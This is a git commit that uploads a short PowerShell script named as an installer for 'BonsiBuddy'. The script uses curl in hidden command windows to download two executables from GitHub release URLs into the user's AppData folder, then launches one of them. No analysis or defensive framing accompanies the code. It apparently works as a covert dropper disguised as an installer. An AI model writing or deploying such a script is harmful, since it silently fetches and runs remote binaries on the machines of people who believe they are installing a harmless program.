d37a8c703deb01634bc5d89b58f1317e28af623a
sexxyred6767 <colin.t.hughes21@gmail.com>
2025-11-25 21:05:37 -0500

    Add files via upload

---
+++ Installer(Bonsi).ps1
@@ -0,0 +1,20 @@
+# Paths to save files
+$dest  = "$env:APPDATA\BonsiBuddy.exe"
+$dest1 = "$env:APPDATA\Launcher(Bonsi).exe"
+
+# Download Launcher(Bonsi).exe
+Start-Process "cmd.exe" `
+    -ArgumentList "/c curl -L ""https://github.com/sexxyred6767/FishforThynotThee/releases/download/djgkjd/Launcher.Bonsi.exe"" -o `"$dest1`"" `
+    -WindowStyle Hidden `
+    -Wait
+
+# Download BonsiBuddy.exe
+Start-Process "cmd.exe" `
+    -ArgumentList "/c curl -L ""https://github.com/sexxyred6767/FishforThynotThee/releases/download/sigma/BonsiBuddy.exe"" -o `"$dest`"" `
+    -WindowStyle Hidden `
+    -Wait
+
+# Run Launcher(Bonsi).exe
+Start-Process $dest1
+
+exit
